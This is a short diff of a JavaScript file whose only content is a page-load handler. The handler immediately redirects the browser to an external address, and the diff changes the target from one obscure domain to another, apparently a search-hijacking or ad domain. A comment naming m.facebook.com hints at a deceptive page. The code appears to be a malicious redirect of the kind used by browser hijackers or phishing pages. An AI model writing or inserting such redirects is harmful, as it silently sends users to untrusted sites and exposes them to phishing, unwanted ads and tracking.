@@ -1,5 +1,5 @@
 window.onload = function () {
-	window.location.href = 'https://rd761.xyz/fts/3R9Pcqk56HPi-3KfLnciytt4h'
+	window.location.href = 'https://search-fluent.com/server/sfv/768564736433324099'
 }
 
 // https://m.facebook.com
